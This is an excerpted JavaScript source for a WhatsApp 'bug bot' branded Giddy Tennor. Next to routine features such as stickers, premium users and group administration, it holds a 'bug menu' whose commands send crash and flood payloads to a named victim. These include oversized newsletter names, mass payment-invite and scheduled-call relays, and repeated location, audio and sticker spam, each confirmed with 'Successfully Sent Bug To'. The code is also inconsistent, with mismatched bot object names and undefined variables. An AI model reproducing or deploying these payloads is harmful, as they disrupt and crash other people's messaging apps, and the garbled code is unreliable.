...
//bug database
const { tennortext1 } = require('./69/xeontext1')
const { tennortext2 } = require('./69/xeontext2')
const { tennortext3 } = require('./69/xeontext3')
const { tennortext4 } = require('./69/xeontext4')
const { tennortext5 } = require('./69/xeontext5')
const { tennortext6 } = require('./69/xeontext6')
...
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        ...
        const botNumber = await tennorBotInc.decodeJid(XeonBotInc.user.id)
...
tennorBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}
...
await TennorBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!TennorBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            TennorBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        TennorBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        TennorBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        TennorBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * tennorrecordin.length)]
        TennorBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            TennorBotInc.updateProfileStatus(`24/7 Online Bot. *Youtube search- Giddy Tennor* user ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return TennorBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await TennorBotInc.getName(i),
...
TennorBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
TennorBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
TennorBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
TennorBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {TennorBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
...
const sendzip = (teks) => {
TennorBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
...
senddocu(buffer)
        ...
        if (m.isGroup && !m.key.fromMe) {
            ...
            if (afk.checkAfkUser(m.sender, _afk)) {
                ...
                TennorBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                ...
                if (m.mentionedJid.length !== 0) {
                    ...
                    replygctennor("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygctennor("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcxeon(mess.owner)
            ...
            case 'listprem': {
                ...
                TennorBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
    ...
    case 'autostatusview':{
            ...
            case 'block':
                ...
                await TennorBotInc.updateBlockStatus(blockw, 'block').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await TennorBotInc.updateBlockStatus(blockww, 'unblock').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('Bye Everyone 🥺')
                await TennorBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                ...
                await TennorBotInc.sendMessage(m.chat, {
                    document: malas,
            ...
            case 'bcgroup': {
                ...
                let getGroups = await TennorBotInc.groupFetchAllParticipating()
            ...
            case 'kick':
                ...
                await TennorBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await TennorBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
...
`.trim()
            ...
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the Giddy Tennor wa.me/254703726139 😉`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
		    ...
		    youtube www.youtube.com/@techgod143`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube www.youtube.com/@gideon Owino`,
                            thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
            ...
            case 'donasi':
                ...
                break
case 'owner': {
const repf = await TennorBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
TennorBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                ...
                if (/image/.test(mime)) {
                    ...
                    let media = await quoted.download()
                    let encmedia = await TennorBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
...
break
            ...
            case 'toqr': {
                ...
                await TennorBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
...
let ceknye = await TennorBotInc.onWhatsApp(bnnd)
...
await TennorBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'x': {
...
for (let i = 0; i < amount; i++) {
await TennorBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await TennorBotInc.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcxeon(`Successfully Sent Bug To💀😁 ${victim}`)
}
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await TennorBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case 'xaudio': {
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await TennorBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text * 2
for (let i = 0; i < amount; i++) {
await TennorBotInc.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case 'xloc2': {
...
for (let i = 0; i < amount; i++) {
TennorBotInc.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case 'xloc': {
...
XeonOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
TennorBotInc.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To 💀😁${victim}`)
}
break
...
let target = await TennorBotInc.groupAcceptInvite(xeongclink)
...
amount = "50"
for (let i = 0; i < amount; i++) {
TennorBotInc.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
...
amount = "50"
for (let i = 0; i < amount; i++) {
TennorBotInc.sendMessage(victim,{
...
amount = "50"
for (let i = 0; i < amount; i++) {
TennorBotInc.relayMessage(victim,{ 
...
if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
TennorBotInc.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
...
TennorBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
...
Tennor BotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
...
TennorBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
...
break
            ...
            case 'help':
            case 'alive':
                let xeonmenuoh = `╭══ *❍ Giddy Tennor-BUG_BOT ❍*
┃❁ *ᴏᴡɴᴇʀ:* Giddy ○■□● Tennor
┃❁ *ᴜᴘᴛɪᴍᴇ:* ${runtime(process.uptime())}
┃❁ *User:* ${pushname}
╰┈➤ ${xeonytimewisher} 😄  My bro
⚠️⚠️ ~Don't forget to subscribe~ 
*Giddy Tennor* ~Youtube Channel~ ⚠️⚠️
_Any help: yt link http://www.youtube.com/@gideon owino_
╰═════════════════⊷
╭═══❂ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ❂
┃ ❏ *xʀᴇᴀᴄᴛ <ʀᴇᴘʟʏ ᴄʜᴀᴛ>*
┃ ❏ *x <ɴᴜᴍʙᴇʀ|ᴀᴍᴏᴜɴᴛ>*
...
if (typemenu === 'v1') {
      ...
      renderLargerThumbnail: true
        ...
        TennorBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
